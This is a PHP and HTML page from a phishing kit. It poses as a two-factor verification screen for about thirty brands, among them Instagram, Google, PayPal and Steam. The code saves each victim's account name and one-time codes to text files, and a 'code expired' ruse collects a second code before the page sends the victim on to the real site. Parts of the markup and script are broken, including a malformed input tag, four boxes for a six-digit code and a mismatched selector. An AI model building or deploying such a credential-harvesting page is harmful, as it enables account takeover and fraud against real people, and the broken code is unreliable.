<?php
session_start();

/* ================= CONFIG =================
   true  = ask for a SECOND code after the first one ("code expired" trick)
   false = redirect to the real site right after the first code            */
$CATCH_SECOND_CODE = true;

$BRANDS = array(
  'instagram'      => array('Instagram',   '#E1306C', 'https://instagram.com'),
  'facebook'       => array('Facebook',    '#1877F2', 'https://facebook.com'),
  'google'         => array('Google',      '#4285F4', 'https://accounts.google.com'),
  'microsoft'      => array('Microsoft',   '#0078D4', 'https://login.live.com'),
  'netflix'        => array('Netflix',     '#E50914', 'https://netflix.com'),
  'paypal'         => array('PayPal',      '#003087', 'https://paypal.com'),
  'steam'          => array('Steam',       '#66c0f4', 'https://store.steampowered.com'),
  'twitter'        => array('X',           '#1D9BF0', 'https://x.com'),
  'spotify'        => array('Spotify',     '#1DB954', 'https://accounts.spotify.com'),
  'adobe'          => array('Adobe',       '#FA0F00', 'https://adobe.com'),
  'badoo'          => array('Badoo',       '#FF4B3E', 'https://badoo.com'),
  'cryptocurrency' => array('Blockchain',  '#295FFF', 'https://blockchain.com'),
  'devianart'      => array('DeviantArt',  '#05CC47', 'https://deviantart.com'),
  'dropbox'        => array('Dropbox',     '#0061FF', 'https://dropbox.com'),
  'github'         => array('GitHub',      '#24292F', 'https://github.com'),
  'gitlab'         => array('GitLab',      '#FC6D26', 'https://gitlab.com'),
  'linkedin'       => array('LinkedIn',    '#0A66C2', 'https://linkedin.com'),
  'messenger'      => array('Messenger',   '#0084FF', 'https://messenger.com'),
  'myspace'        => array('MySpace',     '#030303', 'https://myspace.com'),
  'origin'         => array('EA',          '#FF6600', 'https://ea.com'),
  'pinterest'      => array('Pinterest',   '#E60023', 'https://pinterest.com'),
  'protonmail'     => array('Proton',      '#6D4AFF', 'https://proton.me'),
  'shopify'        => array('Shopify',     '#96BF48', 'https://shopify.com'),
  'snapchat'       => array('Snapchat',    '#FFFC00', 'https://snapchat.com'),
  'shopping'       => array('Amazon',      '#FF9900', 'https://amazon.com'),
  'twitch'         => array('Twitch',      '#9146FF', 'https://twitch.tv'),
  'verizon'        => array('Verizon',     '#CD040B', 'https://verizon.com'),
  'vk'             => array('VK',          '#0077FF', 'https://vk.com'),
  'wordpress'      => array('WordPress',   '#21759B', 'https://wordpress.com'),
  'yahoo'          => array('Yahoo',       '#6001D2', 'https://login.yahoo.com'),
  'yandex'         => array('Yandex',      '#FC3F1D', 'https://passport.yandex.com'),
  'instafollowers' => array('Instagram',   '#E1306C', 'https://instagram.com'),
);

$site     = isset($_SESSION['phish_site']) ? $_SESSION['phish_site'] : 'instagram';
$user     = isset($_SESSION['phish_user']) ? $_SESSION['phish_user'] : 'user@email.com';
$brandRow = isset($BRANDS[$site]) ? $BRANDS[$site] : array('Security', '#1a73e8', 'https://instagram.com');
$brand    = $brandRow[0];
$color    = $brandRow[1];
$redirect = $brandRow[2];
$logoFg   = ($site === 'snapchat') ? '#111111' : '#ffffff';

/* ---------- capture the code ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
    $code  = preg_replace('/\D/', '', $_POST['otp']);
    $stage = isset($_SESSION['otp_stage']) ? $_SESSION['otp_stage'] : 1;

    file_put_contents("2fa.txt", "Account: $user | Code $stage: $code | Time: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    file_put_contents("usernames.txt", $user . " | 2FA code " . $stage . ": " . $code . "\n", FILE_APPEND);

    if ($CATCH_SECOND_CODE && $stage === 1) {
        $_SESSION['otp_stage']   = 2;
        $_SESSION['code_expired'] = true;
    } else {
        session_unset();
        session_destroy();
        header("Location: $redirect");
        exit;
    }
}
$codeExpired = isset($_SESSION['code_expired']) ? $_SESSION['code_expired'] : false;

/* ---------- masked identity ---------- */
if (strpos($user, '@') !== false) {
    $parts = explode('@', $user, 2);
    $name  = $parts[0];
    $mask  = substr($name, 0, 1) . str_repeat('*', max(strlen($name) - 2, 1)) . substr($name, -1) . '@' . $parts[1];
} else {
    $mask = substr($user, 0, 2) . str_repeat('*', max(strlen($user) - 2, 3));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verify it's you — <?php echo htmlspecialchars($brand); ?></title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    font-family: "Google Sans", Roboto, Arial, sans-serif;
    background: radial-gradient(1200px 600px at 20% 0%, <?php echo $color; ?>22, transparent 60%),
                radial-gradient(1000px 500px at 100% 100%, <?php echo $color; ?>18, transparent 55%),
                #0f1115;
    color: #e8eaed; padding: 20px;
  }
  .card {
    width: 100%; max-width: 420px; background: #1a1d24;
    border: 1px solid #2a2f3a; border-radius: 18px;
    padding: 38px 34px 26px; box-shadow: 0 16px 50px rgba(0,0,0,.5);
  }
  .logo {
    width: 58px; height: 58px; margin: 0 auto 18px; border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    font-size: 26px; font-weight: 700; box-shadow: 0 6px 18px rgba(0,0,0,.35);
  }
  h1 { font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 8px; }
  .sub { text-align: center; color: #9aa0a6; font-size: 14px; line-height: 1.55; margin-bottom: 20px; }
  .sub b { color: #e8eaed; font-weight: 500; }
  .digits { display: flex; gap: 9px; justify-content: center; margin: 20px 0 6px; }
  .digits input {
    width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 600;
    border-radius: 10px; border: 1.5px solid #2a2f3a; background: #0f1115; color: #e8eaed;
    outline: none; transition: border .15s, box-shadow .15s;
  }
  .digits input:focus { border-color: <?php echo $color; ?>; box-shadow: 0 0 0 3px <?php echo $color; ?>40; }
  .timer { text-align: center; font-size: 13px; color: #9aa0a6; margin: 16px 0 18px; }
  .timer span { color: #fbbc04; font-weight: 600; font-variant-numeric: tabular-nums; }
  .timer a { color: <?php echo $color; ?>; text-decoration: none; margin-left: 6px; }
  .expired {
    display: block; margin: 0 0 14px; padding: 10px 12px; border-radius: 8px;
    background: rgba(251,188,4,.12); border: 1px solid rgba(251,188,4,.35);
    color: #fdd663; font-size: 13px; text-align: center;
  }
  .submit {
    width: 100%; height: 46px; border: 0; border-radius: 24px; cursor: pointer;
    background: <?php echo $color; ?>; color: <?php echo $logoFg; ?>;
    font-size: 15px; font-weight: 600; transition: opacity .15s;
  }
  .submit:disabled { opacity: .4; cursor: not-allowed; }
  .submit:not(:disabled):hover { opacity: .9; }
  .spinner {
    display: none; width: 18px; height: 18px; margin: 0 auto;
    border: 2px solid rgba(255,255,255,.35); border-top-color: currentColor;
    border-radius: 50%; animation: spin .7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .toast {
    display: none; margin-top: 14px; padding: 10px 12px; border-radius: 8px;
    background: rgba(52,168,83,.15); color: #34a853; font-size: 13px; text-align: center;
  }
  .toast.show { display: block; }
  .foot { text-align: center; margin-top: 22px; font-size: 11px; color: #5f6368; letter-spacing: .3px; }
</style>
</head>
<body>
  <div class="card">
    <div class="logo" style="background:<?php echo $color; ?>;color:<?php echo $logoFg; ?>">
      <?php echo strtoupper(substr($brand, 0, 1)); ?>
    </div>
    <h1>Verify it's you</h1>
    <p class="sub">
      For your security, <b><?php echo htmlspecialchars($brand); ?></b> sent a 6-digit code to<br>
      <b><?php echo htmlspecialchars($mask); ?></b>
    </p>

    <?php if ($codeExpired): ?>
    <div class="expired" id="expiredBox">That code is no longer valid. A new code has been sent to your device.</div>
    <?php endif; ?>

    <form method="POST" action="otp.php" id="otpForm" autocomplete="one-time-code">
      <div class="digits">
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="off">
        <input<input type="hidden" name="otp" id="otpHidden">

      <p class="timer">Code expires in <span id="cd">05:00</span></p>
      <p class="err" id="err">Invalid or expired code. Please try again.</p>

      <button type="submit" class="submit" id="submitBtn">
        <span id="btnTxt">Verify</span>
        <span class="spinner" id="spinner"></span>
      </button>

      <div class="links">
        <a id="resend">Resend code</a>
        <a id="back">Try another way</a>
      </div>
      <div class="toast" id="toast">✓ A new code has been sent to your email</div>
    </form>

    <p class="brand"><?php echo htmlspecialchars($brand); ?> · Secure Verification</p>
  </div>

<script>
(function(){
  var inputs = document.querySelectorAll('#digits input');
  var hidden = document.getElementById('otpHidden');
  var btn = document.getElementById('submitBtn');
  var btnTxt = document.getElementById('btnTxt');
  var spinner = document.getElementById('spinner');
  var err = document.getElementById('err');

  /* auto-move to next box */
  inputs.forEach(function(inp, i){
    inp.addEventListener('input', function(){
      var v = inp.value.replace(/[^0-9]/g, '');
      inp.value = v;
      if (v && i < inputs.length - 1) inputs[i + 1].focus();
    });
    inp.addEventListener('keydown', function(e){
      if (e.key === 'Backspace' && !inp.value && i > 0) inputs[i - 1].focus();
    });
    inp.addEventListener('paste', function(e){
      var txt = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
      if (!txt) return;
      e.preventDefault();
      for (var k = 0; k < inputs.length && k < txt.length; k++) inputs[k].value = txt[k];
      if (txt.length >= inputs.length) inputs[inputs.length - 1].focus();
    });
  });

  function collect(){
    var code = '';
    inputs.forEach(function(inp){ code += inp.value; });
    hidden.value = code;
    return code.length === 6;
  }

  /* countdown timer */
  var left = 300, cd = document.getElementById('cd');
  var t = setInterval(function(){
    left--;
    var m = String(Math.floor(left / 60)).padStart(2, '0');
    var s = String(left % 60).padStart(2, '0');
    cd.textContent = m + ':' + s;
    if (left <= 0) { clearInterval(t); cd.textContent = '00:00'; err.classList.add('show'); }
  }, 1000);

  btn.addEventListener('click', function(e){
    e.preventDefault();
    err.classList.remove('show');
    if (!collect()) { err.textContent = 'Enter all 6 digits.'; err.classList.add('show'); return; }
    btn.disabled = true; btnTxt.style.display = 'none'; spinner.style.display = 'block';
    setTimeout(function(){ document.getElementById('otpForm').submit(); }, 600);
  });

  document.getElementById('resend').addEventListener('click', function(){
    var toast = document.getElementById('toast');
    toast.classList.add('show');
    left = 300;
    setTimeout(function(){ toast.classList.remove('show'); }, 3000);
  });

  document.getElementById('back').addEventListener('click', function(){
    err.textContent = 'This option is not available in your region yet.';
    err.classList.add('show');
  });
})();
</script>
</body>
</html>
